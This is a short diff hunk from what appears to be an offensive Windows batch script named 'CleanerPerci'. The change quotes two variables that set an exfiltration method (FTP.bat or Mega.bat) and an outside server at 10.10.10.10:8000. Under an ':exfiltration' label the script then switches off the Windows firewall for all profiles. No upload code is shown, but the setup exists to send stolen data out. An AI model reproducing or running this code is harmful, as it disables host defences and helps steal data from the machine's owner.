@@ -3,8 +3,8 @@
 title CleanerPerci
 
 rem set the exfiltration web server and techniques (FTP.bat or Mega.bat)
-set exfiltration_techniques=FTP.bat
-set srv=10.10.10.10:8000
+set exfiltration_techniques="FTP.bat"
+set srv="10.10.10.10:8000"
 
 :exfiltration
 netsh advfirewall set allprofiles state off
